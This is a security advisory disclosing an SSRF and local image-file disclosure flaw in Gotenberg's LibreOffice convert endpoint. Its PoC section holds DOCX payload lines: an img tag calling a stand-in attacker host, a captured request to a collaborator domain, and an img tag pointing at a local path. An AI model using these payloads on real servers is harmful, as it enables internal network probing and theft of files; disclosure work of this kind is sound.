# [H] Gotenberg: SSRF via LibreOffice document processing

## Summary
Severity: High
Advisory: GHSA-2mrg-35hw-x3x9
CVE: CVE-2026-55229
CWE: CWE-918
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N (CVSS_V3)
Published: 2026-06-18
Source: https://github.com/advisories/GHSA-2mrg-35hw-x3x9
Type: github-advisory

## Affected
- Go: `github.com/gotenberg/gotenberg/v8` — affected >=0 <8.34.0

## Details
**Summary**

 Server-Side Request Forgery (SSRF) vulnerability affecting the `/forms/libreoffice/convert` endpoint in Gotenberg v8.33.0 running with the default configuration.

By uploading a specially crafted DOCX document, an attacker can cause LibreOffice to automatically retrieve external resources during document conversion. As a result, outbound requests are made from the server hosting Gotenberg to attacker-controlled destinations.

Additionally, the same document mechanism appears capable of referencing image resources from the local filesystem. During conversion, LibreOffice attempts to load those resources and embed them into the resulting document.

**PoC**

**External Resource Retrieval**

Create a DOCX document containing the following content:

`<img src="http://[ATTACKER_HOST]:[PORT]/path?query=somedata">`

Upload the document to the `/forms/libreoffice/convert `endpoint.

During document processing, LibreOffice automatically retrieves the referenced external resource.

An outbound request can be observed on Burp Collaborator:

```
GET /secretendpoint?query=hacked HTTP/1.1
Host: gotenbergssrf.3cguefu7x55rg8z13mzu08i45vbmzcn1.oastify.com
User-Agent: LibreOffice 26.2.3.2 denylistedbackend/8.20.0 OpenSSL/3.5.6
Accept: */*
Accept-Encoding: deflate, gzip, br, zstd
```

**Local Resource Retrieval**

Create a DOCX document containing the following content:

`<img src="/path/to/image.png">`

Upload the document to the `/forms/libreoffice/convert `endpoint.

During document conversion, LibreOffice loads the referenced image from the local filesystem and embeds it into the generated output document.

Result in output document (used payload - `<img src="/usr/share/pixmaps/debian-logo.png">`):

<img width="1346" height="397" alt="result" src="https://github.com/user-attachments/assets/52e18316-6654-4341-82e8-14df6c1d7d5e" />


**Impact**

The identified vulnerability enables two primary attack vectors:

Blind SSRF: The conversion service allows arbitrary outbound HTTP(S) requests during document processing. Although response bodies are not returned to the user, this can be leveraged for internal network discovery and interaction with services accessible only from the internal network or relying on network-level trust assumptions.

Local File Disclosure via Image Resource Loading: The conversion engine allows local filesystem resources to be accessed during document rendering when referenced as image sources in the uploaded document. By specifying local file paths in image tags, LibreOffice resolves and embeds the referenced image content into the generated output document. This behavior is limited to resources loadable as images during document conversion, rather than general file read primitives, but may still allow retrieval of sensitive files accessible to the LibreOffice process.

**Notes**

The issue was reproduced on Gotenberg v8.33.0 under the default configuration.

Given the impact of arbitrary outbound HTTP(S) requests (SSRF) and limited local filesystem resource disclosure via image resource loading during document conversion, this issue may warrant a CVE assignment.

## References
- https://github.com/gotenberg/gotenberg/security/advisories/GHSA-2mrg-35hw-x3x9
- https://github.com/gotenberg/gotenberg
